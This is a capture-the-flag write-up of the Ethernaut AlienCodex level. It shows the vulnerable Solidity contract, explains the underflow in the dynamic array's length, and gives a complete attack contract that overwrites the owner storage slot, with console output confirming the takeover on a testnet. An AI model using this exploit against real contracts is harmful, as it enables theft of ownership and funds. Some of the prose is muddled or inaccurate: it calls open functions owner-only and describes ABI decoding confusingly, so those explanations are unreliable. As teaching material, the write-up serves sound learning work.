<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

Challenge's message: 

> You've uncovered an Alien contract. Claim ownership to complete the level.


The AlienCodex is a solidity smart contract that serves as a simple decentralized data storage system. It allows users to record and manage data (represented as bytes32 values) in a publicly accessible array called **codex**. The contract also includes a feature to enforce access control through a modifier named **contacted**. This is a custom modifier used to ensure that certain functions can only be executed when contact has been made. It uses the assert statement to check the value of the contact variable.

Then, the **makeContact()** function allows any user to establish contact with the contract. It sets the contact variable to true, indicating that the user has made contact with the contract. **Only users who have made contact can perform certain operations on the codex**.

After then, there is an external function called **record()** that allows the contract owner to record a new entry in the codex array. The `_content` parameter is the content to be recorded, provided in the form of a bytes32 value.

Also, in the **retract()** external function, it allows the contract owner to retract the last entry in the codex array. This function can only be called after contact has been established.

Finally, we have **revise()** function that allows the contract owner to revise an existing entry in the codex array. The `_content` parameter is the updated content to be recorded, and the `i` parameter indicates the index of the entry to be revised. This function can only be called after contact has been established.

When working with arrays in Solidity, it's crucial to be cautious about the size of the array in the contract's storage. Failure to implement this properly can result in potential security risks, as is the case with this particular contract.


## Dynamic Array Underflow

Dynamic Array Underflow is a vulnerability that can occur in smart contracts written in Solidity. It is a form of "underflow" vulnerability, where the index used to access an element in the dynamic array becomes negative or goes out of bounds due to incorrect calculations or manipulations in the contract code. Thus, the attacker can **get control array's storage in the contract and change the other storage's values what he want**.


In the **retract()** function, there is the `codex.length--;` code. Because of the contract version, there **should be an overflow check** but it is not. So, this code triggers the underflow vulnerability.

## First Underhanded Solidity Contest

The Underhanded Solidity Contest is a specialized programming contest that aims to challenge developers to write Solidity smart contracts that are intentionally deceptive or maliciously crafted to be difficult to detect as harmful. The primary goal of the contest is to identify and expose potential vulnerabilities or pitfalls in smart contract development that might be exploited by malicious actors in real-world scenarios.

In this article, we are talking about one of this scenarios. 

In the context of Ethereum and smart contracts, the ABI is a standard interface that defines how to interact with smart contracts. It acts as a bridge between higher-level programming languages and the low-level Ethereum Virtual Machine (EVM) bytecode. The ABI specifies the rules and conventions for encoding and decoding function calls and data when interacting with smart contracts. It allows external applications, such as web3 libraries, wallets, and other contracts, to communicate with smart contracts on the Ethereum blockchain.

ABI contains two main components:

- **Function Signatures** : Function signatures are used to uniquely identify functions within a smart contract. They consist of the function name and its parameter types, which are hashed using the Keccak-256 (SHA-3) hash function to create a 4-byte function selector.
- **Data Encoding Rules** : The ABI defines how data should be encoded into a format that can be understood by the EVM when making function calls.


On the other hand, sometimes this feautures are not quit pretty. For example, the **ABI decoder does not check for overflows**. For this reason, it can **help the attacker to exploit some underflows** vulnerability. Let me explain this with dynamic array underflow example. 

Consider that we have two dynamic arrays which are `uint a[]` and `uint b[]`. And, let's look at how the ABI works with these arrays.

- `a.length == b.length` is checked for overflows, but it **is not check** the `a.length == NO_OF_A_LENGTH` condition.

The actual problem is that b.length is assumed to equal NO_OF_A_LENGTH but this assumption is not checked anywhere, the overflow only helps in executing the exploit.


 

# Subverting

For passing this challenge, we must get ownership of the contract. That's why, we should know the owner's storage slot in the contract before exploiting the dynamic array underflow vulnerability. When you look at the ABI of the contract, we can see that the Ownable contract's variables are in. In this case, we can reach the owner's slot number from the contract's storage with the `web3.eth.getStorageAt()` method. If you don't know about this method, you can navigate [this website.](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

```js
await contract.owner()
'0x0BC04aa6aaC163A6B3667636D798FA053D43BD11'
```
```js
await web3.eth.getStorageAt(contract.address, 0, console.log)
'0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
```

As you can see, the owner variable is stored along with the boolean type of the contact variable in the first slot. The reason for compressing these values into one slot is to optimize gas usage and save space in the contract. 

The last thing before pass on to the attack contract is calculate index number when we access the array at slot 0 and update the value of owner with our own address. Here is our brainful:

```solidity
uint i = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
```

We used `keccak256(abi.encode(1)` code to directly get in contact with contract's ABI for manipulate the slot's value with dynamic array underflow mechanism. Now, let's look at attack contract.

```solidity
// Target Contract Address -> 0x90Ff4F63Db3919667BF2B3FD78Bd63654a3921E6

pragma solidity ^0.5.0;

import './AlienCodex.sol';

contract Attack{

    AlienCodex target;

    constructor(address _target)public{
        target = AlienCodex(_target);
    }

    function attack()external{
        uint i = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        target.makeContact();
        target.retract();
        target.revise(i, bytes32(uint(uint160(msg.sender))));
    }   
}
```

Basically, we calculated the index and set the contact variable as true. Then, the array will be underflow and update the value of owner with our own address. Let's complete!

Deploy the contract and check the owner of the contract. See in [etherscan.](https://sepolia.etherscan.io/tx/0x42f2d3f4bceefa3c9c5b5b6b6fffd29f7ca1c977a713fe80fbf522d07c9883c7)

```js
await contract.owner()
'0x0BC04aa6aaC163A6B3667636D798FA053D43BD11'
```

After calling attack function, check the owner again. And, the mission is completed. See in [etherscan.](https://sepolia.etherscan.io/tx/0x13bb7ac279736b86cd72e4b78e7f90a351fec8cd117722ef26ef833fe93621f0)

```solidity
await contract.owner()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```
```js
player
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

Ethernaut's message:

> This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload. Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2^256. The user is then able to modify all contract storage. Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)


**_by wasny0ps_**
